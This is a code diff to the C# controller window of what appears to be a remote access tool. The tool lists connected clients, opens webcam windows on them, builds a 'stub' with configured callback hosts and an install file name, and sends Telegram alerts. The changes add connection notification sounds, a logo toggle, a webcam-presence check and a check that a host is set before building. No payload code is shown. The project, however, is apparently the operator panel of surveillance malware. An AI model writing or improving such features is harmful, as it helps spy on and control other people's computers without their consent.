@@ -125,6 +125,7 @@ public partial class ServerWindow : Window
             Log("[*] Server ready. Click START to listen.");
             RefreshAllClients();
             LoadConfig();
+            NotificationService.Initialize(SettingsNotifySound.IsChecked == true);
             // Initialize default host if empty
             if (BldHosts.Items.Count == 0)
                 BldHosts.Items.Add("127.0.0.1");
@@ -408,6 +409,7 @@ public partial class ServerWindow : Window
                 _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                 _server.ClientConnected += c =>
                 {
+                    NotificationService.NotifyConnected(c.Id);
                     // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                     _clientQueue.Enqueue((true, c));
 
@@ -435,6 +437,7 @@ public partial class ServerWindow : Window
                 };
                 _server.ClientDisconnected += c =>
                 {
+                    NotificationService.NotifyDisconnected(c.Id);
                     // UI update batched — feature window closing handled in FlushClientQueue
                     _clientQueue.Enqueue((false, c));
                 };
@@ -772,6 +775,11 @@ public partial class ServerWindow : Window
         int i = 0;
         foreach (var c in clients)
         {
+            if (c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase))
+            {
+                MessageBox.Show($"Client {c.Id} has no webcam device.", "No Webcam", MessageBoxButton.OK, MessageBoxImage.Information);
+                continue;
+            }
             int s = (i % maxSteps) * step;
             OpenFeatureWindow<WebcamWindow>(c.Id, () =>
             {
@@ -1634,6 +1642,12 @@ public partial class ServerWindow : Window
             // Settings tab
             if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
             if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";
+            if (cfg.TryGetValue("NotifySound", out v)) SettingsNotifySound.IsChecked = v == "1";
+            if (cfg.TryGetValue("HideLogo", out v) && v == "1")
+            {
+                SettingsHideLogo.IsChecked = true;
+                BgLogoImage.Visibility = Visibility.Collapsed;
+            }
 
             // Telegram notifications
             if (cfg.TryGetValue("TelegramEnabled", out v)) BldTelegramEnabled.IsChecked = v == "1";
@@ -1689,6 +1703,8 @@ public partial class ServerWindow : Window
                 ["InstallFileName"] = BldInstallFileName.Text.Trim(),
                 ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                 ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
+                ["NotifySound"] = SettingsNotifySound.IsChecked == true ? "1" : "0",
+                ["HideLogo"] = SettingsHideLogo.IsChecked == true ? "1" : "0",
                 ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
                 ["TelegramToken"] = BldTelegramToken.Text.Trim(),
                 ["TelegramChatId1"] = BldTelegramChatId1.Text.Trim(),
@@ -2511,6 +2527,13 @@ Read-Host 'Press Enter to close'
 
     private async void Build_Click(object sender, RoutedEventArgs e)
     {
+        if (BldHosts.Items.Count == 0)
+        {
+            MessageBox.Show("Add at least one host before building.", "No Host Configured",
+                MessageBoxButton.OK, MessageBoxImage.Warning);
+            return;
+        }
+
         var stubDir = GetStubProjectDir();
         if (!Directory.Exists(stubDir))
         {
@@ -2996,6 +3019,20 @@ Read-Host 'Press Enter to close'
             Log("[!] Invalid max clients value.");
         }
 
+        SaveConfig();
+    }
+
+    private void SettingsHideLogo_Changed(object sender, RoutedEventArgs e)
+    {
+        BgLogoImage.Visibility = SettingsHideLogo.IsChecked == true
+            ? Visibility.Collapsed
+            : Visibility.Visible;
+        SaveConfig();
+    }
+
+    private void SettingsNotifySound_Changed(object sender, RoutedEventArgs e)
+    {
+        NotificationService.SetEnabled(SettingsNotifySound.IsChecked == true);
         SaveConfig();
     }
 
@@ -4097,6 +4134,7 @@ Read-Host 'Press Enter to close'
     {
         _screenTimer?.Stop();
         _server?.Stop();
+        NotificationService.Shutdown();
         Application.Current.Shutdown();
     }
 
